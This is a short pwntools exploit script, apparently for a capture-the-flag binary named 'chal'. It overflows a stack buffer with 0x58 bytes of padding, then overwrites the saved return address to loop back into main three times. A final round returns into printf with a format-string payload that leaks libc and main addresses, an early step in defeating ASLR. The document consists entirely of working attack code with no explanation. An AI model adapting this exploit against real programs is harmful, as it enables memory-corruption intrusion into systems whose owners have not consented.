from pwn import *
context.arch='amd64'; context.log_level='error'
e=ELF("./chal")
PRINTF=e.plt['printf']; MAIN=e.symbols['main']
def build(fmt, ret):
    body=(b"exit"+fmt).ljust(0x58,b"A")
    assert b"\x00" not in body
    return body+p64(ret)

# ret2main loop test: do 3 rounds, last round leak.
p=process("./chal")
for i in range(3):
    p.recvuntil(b">> ")
    p.send(build(b"", MAIN))   # return to main -> loop
    print("round",i,"looped ok, got banner next")
p.recvuntil(b">> ")
p.send(build(b"-%6$p-%10$p-", PRINTF))   # leak libc(arg6) and main(arg10)
out=p.recvall(timeout=3)
print("LEAK OUT:", out[:200])
p.close()
